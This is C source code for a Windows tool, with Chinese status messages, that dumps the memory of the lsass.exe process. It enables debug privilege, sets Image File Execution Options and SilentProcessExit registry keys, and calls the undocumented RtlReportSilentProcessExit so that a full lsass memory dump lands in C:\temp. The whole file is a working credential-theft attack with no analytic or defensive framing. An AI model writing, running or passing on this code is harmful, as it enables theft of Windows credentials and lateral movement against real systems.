#include "windows.h"
#include "tlhelp32.h"
#include "stdio.h"
#include "shlwapi.h"

#pragma comment(lib, "shlwapi.lib")

#define IFEO_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
#define SILENT_PROCESS_EXIT_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"
#define LOCAL_DUMP 0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define DUMP_FOLDER L"C:\\temp"
#define MiniDumpWithFullMemory 0x2

typedef NTSTATUS(NTAPI * fRtlReportSilentProcessExit)(
	HANDLE processHandle,
	NTSTATUS ExitStatus
	);

BOOL EnableDebugPriv() {
	HANDLE hToken = NULL;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf(" - 获取当前进程Token失败 %#X\n", GetLastError());
		return FALSE;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
		printf(" - Lookup SE_DEBUG_NAME失败 %#X\n", GetLastError());
		return FALSE;
	}
	TOKEN_PRIVILEGES tokenPriv;
	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;
	tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL)) {
		printf(" - AdjustTokenPrivileges 失败: %#X\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOL setRelatedRegs(PCWCHAR procName) {

	HKEY hkResSubIFEO = NULL;
	HKEY hkResSubSPE = NULL;
	DWORD globalFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;
	DWORD reportingMode = MiniDumpWithFullMemory;
	DWORD dumpType = LOCAL_DUMP, retstatus = -1;

	BOOL ret = FALSE;

	PWCHAR subkeyIFEO = (PWCHAR)malloc(lstrlenW(IFEO_REG_KEY)*2 + lstrlenW(procName)*2 + 5);
	wsprintf(subkeyIFEO, L"%ws%ws", IFEO_REG_KEY, procName);
	PWCHAR subkeySPE = (PWCHAR)malloc(lstrlenW(SILENT_PROCESS_EXIT_REG_KEY)*2 + lstrlenW(procName)*2 + 5);
	wsprintf(subkeySPE, L"%ws%ws", SILENT_PROCESS_EXIT_REG_KEY, procName);

	printf(" - [DEBUGPRINT] Image_File_Execution_Options: %ws\n", subkeyIFEO);
	printf(" - [DEBUGPRINT] SilentProcessExit: %ws\n", subkeySPE);

	do {
		// 设置 Image File Execution Options\<ProcessName> 下GlobalFlag键值为0x200
		if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, subkeyIFEO, &hkResSubIFEO))) {
			printf(" - 打开注册表项 Image_File_Execution_Options 失败: %#X\n", GetLastError());
			break;
		}
		if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubIFEO, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlag, sizeof(globalFlag)))) {
			printf(" - 设置注册表键 GlobalFlag 键值失败: %#X\n", GetLastError());
			break;
		}

		// 设置 SilentProcessExit\<ProcessName> 下 ReporingMode/LocalDumpFolder/DumpType 三个值
		if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, subkeySPE, &hkResSubSPE))) {
			printf(" - 打开注册表项 SilentProcessExit 失败: %#X\n", GetLastError());
			break;
		}
		if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingMode, sizeof(reportingMode)))
			|| ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)DUMP_FOLDER, lstrlenW(DUMP_FOLDER)*2))
			|| ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"DumpType", 0, REG_DWORD, (const BYTE*)&dumpType, sizeof(dumpType)))) {
			printf(" - 设置注册表键 reportingMode|LocalDumpFolder|DumpType 键值失败: %#X\n", GetLastError());
			break;
		}
		printf(" - 注册表设置完成 ...\n");
		ret = TRUE;

	} while (FALSE);
	
	free(subkeyIFEO);
	free(subkeySPE);
	if (hkResSubIFEO)
		CloseHandle(hkResSubIFEO);
	if (hkResSubSPE)
		CloseHandle(hkResSubSPE);

	return ret;
}

DWORD getPidByName(PCWCHAR procName) {
	
	HANDLE hProcSnapshot;
	DWORD retPid = -1;
	hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W pe;

	if (INVALID_HANDLE_VALUE == hProcSnapshot) {
		printf(" - 创建快照失败!\n");
		return -1;
	}
	pe.dwSize = sizeof(PROCESSENTRY32W);
	if (!Process32First(hProcSnapshot, &pe)) {
		printf(" - Process32First Error : %#X\n", GetLastError());
		return -1;
	}
	do {
		if (!lstrcmpiW(procName, PathFindFileName(pe.szExeFile))) {
			retPid = pe.th32ProcessID;
		}
	} while (Process32Next(hProcSnapshot, &pe));
	CloseHandle(hProcSnapshot);
	return retPid;
}

INT main() {

	PCWCHAR targetProcName = L"lsass.exe";
	DWORD pid = -1;
	HMODULE hNtMod = NULL;
	fRtlReportSilentProcessExit fnRtlReportSilentProcessExit = NULL;
	HANDLE hLsassProc = NULL;
	NTSTATUS ntStatus = -1;

	if (!EnableDebugPriv()) {
		printf(" - 启用当前进程DEBUG权限失败: %#X\n", GetLastError());
		return 1;
	}
	printf(" - 启用当前进程DEBUG权限 OK\n");

	if (!setRelatedRegs(targetProcName)) {
		printf(" - 设置相关注册表键值失败: %#X\n", GetLastError());
		return 1;
	}
	printf(" - 设置相关注册表键值 OK\n");

	pid = getPidByName(targetProcName);
	if (-1 == pid) {
		printf(" - 获取目标进程pid: %#X\n", pid);
		return 1;
	}
	printf(" - 获取目标PID: %#X\n", pid);

	do
	{
		hNtMod = GetModuleHandle(L"ntdll.dll");
		if (!hNtMod) {
			printf(" - 获取NTDLL模块句柄失败\n");
			break;
		}
		printf(" - NTDLL模块句柄: %#X\n", (DWORD)hNtMod);
		fnRtlReportSilentProcessExit = (fRtlReportSilentProcessExit)GetProcAddress(hNtMod, "RtlReportSilentProcessExit");
		if (!fnRtlReportSilentProcessExit) {
			printf(" - 获取API RtlReportSilentProcessExit地址失败\n");
			break;
		}
		printf(" - RtlReportSilentProcessExit地址: %#X\n", (DWORD)fnRtlReportSilentProcessExit);
		hLsassProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ, 0, pid);
		if (!hLsassProc) {
			printf(" - 获取lsass进程句柄失败: %#X\n", GetLastError());
			break;
		}
		printf(" - 获取lsass进程句柄: %#X\n", (DWORD)hLsassProc);

		ntStatus = fnRtlReportSilentProcessExit(hLsassProc, 0);
		printf(" - 结束,查看c:\\temp\\lsass*.dmp...RET CODE : %#X\n", (DWORD)ntStatus);

	} while (false);

	if (hNtMod) 
		CloseHandle(hNtMod);
	if (fnRtlReportSilentProcessExit) 
		CloseHandle(fnRtlReportSilentProcessExit);
	if (hLsassProc)
		CloseHandle(hLsassProc);
	if (fnRtlReportSilentProcessExit)
		fnRtlReportSilentProcessExit = NULL;

	return 0;
}
